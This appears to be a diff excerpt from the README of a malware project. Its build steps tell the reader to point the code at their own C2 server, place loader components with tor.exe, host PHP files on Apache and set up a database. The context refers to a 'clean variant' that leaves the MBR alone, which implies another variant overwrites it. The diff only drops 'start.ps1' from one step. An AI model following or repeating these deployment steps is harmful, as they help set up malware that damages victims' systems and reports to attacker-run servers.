@@ -36,7 +36,7 @@ The clean variant does not overwrite the MBR and does not create a bootloader.
 - Link dependencies
 - Modifi C2 server url with your
 - Build all.
-- Put Init and ONloader in the same folder as tor.exe, start.ps1, images and dlls.(You can find 'tor.exe' in the Tor browser files)
+- Put Init and ONloader in the same folder as tor.exe, images and dlls.(You can find 'tor.exe' in the Tor browser files)
 - Put php files on apache server and modify connection dates
 - Create a database and import tables
 - Test it on VM
